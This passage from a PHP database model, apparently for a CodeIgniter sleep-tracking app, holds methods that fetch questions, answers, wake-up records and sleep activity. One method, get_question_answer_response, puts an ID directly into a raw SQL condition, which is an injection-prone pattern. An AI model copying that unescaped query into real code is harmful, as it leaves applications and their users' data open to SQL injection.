            return false;
        }
    }
    
    public function get_wake_up_by_id($id) {
        $this->db->select('main_custom_name');
        $this->db->from('wake_up_master');
        $this->db->where('id', $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function saveWakeUp($insert_arr) {
        if ($this->db->insert('wake_up_saver', $insert_arr)) {
            return true;
        } else {
            return false;
        }
    }

    public function get_questions() {
        $this->db->select('*');
        $this->db->from('question');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function get_answers() {
        $this->db->select('*');
        $this->db->from('answer');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function get_question_answer_response($id) {
        $this->db->select('*');
        $this->db->from('question_response');
        $this->db->where("FIND_IN_SET('$id', question_id) > 0");
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function insert_q_a($insertArr) {
        if ($this->db->insert('question_response', $insertArr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function fetch_sleep_activity($user_id, $sleep_time) {
        $this->db->select('id');
        $this->db->from('sleep_activity_saver');
        $this->db->where('user_id', $user_id);
        $this->db->where('DATE(sleep_time)', date('Y-m-d', strtotime($sleep_time)));
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array()[0];
        } else {
            return false;
        }
    }

}